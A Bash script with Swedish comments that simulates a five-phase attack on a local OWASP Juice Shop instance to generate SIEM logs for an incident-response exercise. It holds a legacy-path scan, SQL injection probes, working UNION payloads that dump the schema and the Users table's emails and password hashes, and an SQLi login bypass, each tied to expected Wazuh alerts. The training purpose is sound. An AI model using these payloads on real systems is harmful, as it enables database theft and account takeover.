#!/usr/bin/env bash
#
# Simulera en realistisk attack-kedja mot Juice Shop.
# Avsedd som loggdataset för incident response-övning.
#
# DUAL-ACTOR-MODELL:
# Skriptet simulerar TVÅ olika "angripare" som råkar vara aktiva samtidigt:
#
#   Fas 1  = Automatiserad scanner-bot (bakgrundsbrus). Vet inget om appen,
#            skjuter klassiska legacy-paths blint. Detta är vad varje
#            internet-exponerad tjänst har som baseline-trafik 24/7.
#
#   Fas 2-5 = Skicklig manuell angripare. Har redan gjort recon PASSIVT
#            (devtools/Burp Suite) och vet exakt vilka endpoints som finns.
#            Hens recon-fas är därför OSYNLIG för server-side SIEM —
#            attacken börjar direkt med aktiv exploatering.
#
# Detta speglar verkligheten i en SOC: man ser alltid både brus och
# riktade attacker samtidigt. Övningens kärnfråga: kan du skilja signal
# från brus?
#
# Total körtid: ca 8-10 minuter.
#
# Användning:
#   ./simulera-attackkedja.sh                
#   default mål: http://localhost:3000
#   Med environment-variabel för annat mål:
#.  TARGET=http://localhost:3001 ./simulera-attackkedja.sh
#
# Förutsättning: stacken körs (docker compose up -d).

set -u

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
TARGET="${TARGET:-http://localhost:3000}"
LOG_DIR="${LOG_DIR:-$SCRIPT_DIR/tmp/attack-chain-$(date +%Y%m%d-%H%M%S)}"
mkdir -p "$LOG_DIR"

log() { printf "[%s] %s\n" "$(date -u +%H:%M:%S)" "$*"; }

log "=== Attack-kedja startar mot $TARGET ==="
log "Loggar/svar sparas i $LOG_DIR"
log ""
sleep 2

#
# FAS 1 — Automatiserad bot-scanning (bakgrundsbrus)
# En drive-by-scanner skjuter klassiska PHP/WordPress/Apache-paths blint.
# Sådana bots scannar HELA internet konstant och bryr sig inte om vad
# de hittar — de letar bara efter välkända sårbarheter att utnyttja.
#
# Mot en SPA är denna typ av scan i princip osynlig: frontend serverar
# samma index.html med HTTP 200 för alla okända paths, så Wazuh ser
# INTE "många 404s från samma IP". Bara /api/v1/admin (som råkar gå till
# backend) kraschar med 500 och triggar en alert.
#
# OBS: En manuell angripare hade aldrig gjort detta. Hen hade öppnat
# webbläsarens devtools, sett att det är en SPA, och börjat direkt med
# fas 2 nedan. Den manuella angriparens recon är *helt osynlig* för
# Wazuh — devtools-aktivitet lämnar inga server-loggar.
#
log "=== FAS 1: Automatiserad bot — scanning av legacy-paths ==="
for path in /admin /administrator /phpmyadmin /wp-admin /wp-login.php /.env /.git/config /backup.zip /config.php /server-status /api/v1/admin /robots.txt.bak /.htaccess /shell.php; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$path")
    log "  GET $path  ->  HTTP $code"
    sleep $((RANDOM % 5 + 2))
done

log ""
log "  Paus 45 sekunder före fas 2..."
sleep 45

#
# FAS 2 — SQL injection probing (skicklig manuell angripare)
# Här börjar den RIKTIGA angriparens aktivitet. Hen har redan gjort
# recon passivt via devtools/Burp Suite och vet att /rest/products/search
# tar en q-parameter. Nu testas olika SQLi-payloads för att hitta vilket
# format som matchar Juice Shops query-struktur.
#
# Misslyckade UNION-försök med fel antal kolumner genererar HTTP 500
# och triggar rule 31103 (SQL injection attempt) flera gånger.
#
# Payloads skrivs i klartext — curl --data-urlencode encodar automatiskt.
#
log "=== FAS 2: SQL injection probing — misslyckade försök ==="
declare -a PROBES=(
    "apple'"
    "apple' OR 1=1--"
    "apple' UNION SELECT 1--"
    "apple' UNION SELECT 1,2--"
    "apple' UNION SELECT 1,2,3--"
    "apple' UNION SELECT * FROM users--"
    "apple')) OR 1=1--"
)
i=0
for payload in "${PROBES[@]}"; do
    i=$((i+1))
    code=$(curl -s -o "$LOG_DIR/probe_${i}.json" -w "%{http_code}" \
        --get "$TARGET/rest/products/search" \
        --data-urlencode "q=$payload")
    log "  SQLi probe $i  ->  HTTP $code   ($payload)"
    sleep $((RANDOM % 6 + 4))
done

log ""
log "  Paus 60 sekunder före fas 3..."
sleep 60

#
# FAS 3 — Lyckad SQLi: dumpa databasschema via sqlite_master
# Wazuh ser HTTP 200 + attack-pattern -> rule 31106 (web attack returned 200).
# Detta är det "tysta" tecknet på att något lyckats — analytikern måste
# titta på request:en, inte bara statuskoden.
#
log "=== FAS 3: SQL injection lyckas — extrahera databasschema ==="
# Payload i klartext (curl encodar via --data-urlencode):
#   qwert')) UNION SELECT name,type,'3','4','5','6','7','8','9' FROM sqlite_master--
# Products-tabellen har 9 kolumner — UNION:en måste matcha. De första två
# (name, type) hämtas från sqlite_master; resten är dummy-strängar.
curl -s -o "$LOG_DIR/schema_dump.json" \
    --get "$TARGET/rest/products/search" \
    --data-urlencode "q=qwert')) UNION SELECT name,type,'3','4','5','6','7','8','9' FROM sqlite_master--"
TABLES=$(grep -oE '"id":"[A-Za-z]+"' "$LOG_DIR/schema_dump.json" | head -10 | tr '\n' ' ')
log "  Tabeller extraherade: $TABLES"
log "  Full dump: $LOG_DIR/schema_dump.json"

log ""
log "  Paus 75 sekunder före fas 4..."
sleep 75

#
# FAS 4 — Lyckad SQLi: extrahera Users-tabellen (Christmas Special)
# Pwning-guidens utmaning. UNION-attack som returnerar alla användares
# email + password-hash. Rule 31106 triggar igen.
#
log "=== FAS 4: SQL injection lyckas — extrahera admin-credentials ==="
# Payload i klartext:
#   qwert')) UNION SELECT id,email,password,'4','5','6','7','8','9' FROM Users--
# Vi väljer 9 kolumner: id, email, password från Users-tabellen, plus
# 6 dummy-strängar för att matcha Products-tabellens kolumnantal.
curl -s -o "$LOG_DIR/users_dump.json" \
    --get "$TARGET/rest/products/search" \
    --data-urlencode "q=qwert')) UNION SELECT id,email,password,'4','5','6','7','8','9' FROM Users--"
USERS=$(grep -oE '"name":"[^"]+"' "$LOG_DIR/users_dump.json" | head -3 | tr '\n' ' ')
log "  Användare extraherade: $USERS"
log "  Full dump: $LOG_DIR/users_dump.json"

log ""
log "  Paus 60 sekunder före fas 5..."
sleep 60

#
# FAS 5 — Login bypass via SQLi i email-fältet
# Klassisk authentication bypass. POST-body innehåller payloaden, så
# Wazuh's URL-baserade regler MISSAR detta — analytikern måste hitta det
# via timing-mönster och svaret (JWT-token returneras = lyckad inloggning).
#
log "=== FAS 5: Login bypass via SQLi i email-fältet ==="
curl -s -X POST "$TARGET/rest/user/login" \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@juice-sh.op'\'' OR 1=1--","password":"anything"}' \
    -o "$LOG_DIR/login_bypass.json"
if grep -q '"authentication"' "$LOG_DIR/login_bypass.json"; then
    log "  Login bypass LYCKADES — JWT-token returnerad"
else
    log "  Login bypass misslyckades"
fi
log "  Full svar: $LOG_DIR/login_bypass.json"

log ""
log "=== Attack-kedja klar ==="
log ""
log "Förväntade Wazuh-events att leta efter (filtrera på agent.name: nginx-proxy):"
log "  Fas 1 — typiskt 1 alert (rule 31122 för /api/v1/admin). SPA döljer resten."
log "  Fas 2 — rule.id 31103 (SQL injection attempt) flera gånger + 31122 (500-error)"
log "  Fas 3 — rule.id 31106 (web attack returned 200)"
log "  Fas 4 — rule.id 31106 (web attack returned 200)"
log "  Fas 5 — TROLIGEN INGEN ALERT — POST-body undviker URL-baserade regler"
log ""
log "OBS: Den skickliga angriparens recon-fas (devtools/Burp) syns INTE"
log "i Wazuh — den är strukturellt osynlig för server-side SIEM."
log ""
log "Allt sparat i: $LOG_DIR"
